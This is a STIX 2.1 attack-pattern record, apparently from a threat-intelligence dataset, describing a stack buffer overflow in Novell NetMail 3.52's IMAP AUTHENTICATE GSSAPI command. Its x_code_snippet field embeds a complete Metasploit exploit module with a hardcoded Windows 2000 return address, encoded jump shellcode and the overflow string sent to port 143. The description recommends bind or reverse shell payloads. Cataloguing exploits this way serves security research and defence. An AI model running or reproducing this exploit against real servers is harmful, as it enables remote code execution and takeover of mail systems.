{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--39edad49-bbe8-48a1-be7e-59983f790a3f",
    "created": "2024-08-14T16:47:38.955711Z",
    "modified": "2024-08-14T16:47:38.955716Z",
    "name": "Novell NetMail IMAP AUTHENTICATE Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in Novell's NetMail 3.52 IMAP AUTHENTICATE GSSAPI command. By sending an overly long string, an attacker can overwrite the buffer and control program execution. Using the PAYLOAD of windows/shell_bind_tcp or windows/shell_reverse_tcp allows for the most reliable results. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/imap/novell_netmail_auth.rb",
            "external_id": "novell_netmail_auth.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Novell NetMail IMAP AUTHENTICATE Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in Novell's NetMail 3.52 IMAP AUTHENTICATE\n        GSSAPI command. By sending an overly long string, an attacker can overwrite the\n        buffer and control program execution. Using the PAYLOAD of windows/shell_bind_tcp\n        or windows/shell_reverse_tcp allows for the most reliable results.\n      },\n      'Author'         => [ 'MC' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'OSVDB', '55175' ]\n        ],\n      'Privileged'     => true,\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n          'AllowWin32SEH' => true\n        },\n      'Payload'        =>\n        {\n          'Space'    => 850,\n          'BadChars' => \"\\x00\\x20\\x2c\\x3a\\x40\",\n          'PrependEncoder' => \"\\x81\\xc4\\x54\\xf2\\xff\\xff\",\n          'EncoderType'   => Msf::Encoder::Type::AlphanumUpper,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows 2000 SP0-SP4 English', { 'Ret' => 0x75022ac4 } ],\n        ],\n      'DisclosureDate' => '2007-01-07',\n      'DefaultTarget'  => 0))\n\n    register_options( [ Opt::RPORT(143) ])\n  end\n\n  def exploit\n    connect\n    sock.get_once\n\n    jmp =  \"\\x6a\\x05\\x59\\xd9\\xee\\xd9\\x74\\x24\\xf4\\x5b\\x81\\x73\\x13\\x2f\\x77\\x28\"\n    jmp << \"\\x4b\\x83\\xeb\\xfc\\xe2\\xf4\\xf6\\x99\\xf1\\x3f\\x0b\\x83\\x71\\xcb\\xee\\x7d\"\n    jmp << \"\\xb8\\xb5\\xe2\\x89\\xe5\\xb5\\xe2\\x88\\xc9\\x4b\"\n\n    sploit  =  \"A001 AUTHENTICATE GSSAPI\\r\\n\"\n    sploit  << rand_text_alpha_upper(1258) + payload.encoded + \"\\xeb\\x06\"\n    sploit  << rand_text_alpha_upper(2) + [target.ret].pack('V')\n    sploit  << make_nops(8) + jmp + rand_text_alpha_upper(700)\n\n    print_status(\"Trying target #{target.name}...\")\n    sock.put(sploit + \"\\r\\n\" + \"A002 LOGOUT\\r\\n\")\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2007-01-07",
    "x_mitre_platforms": [
        "win'"
    ]
}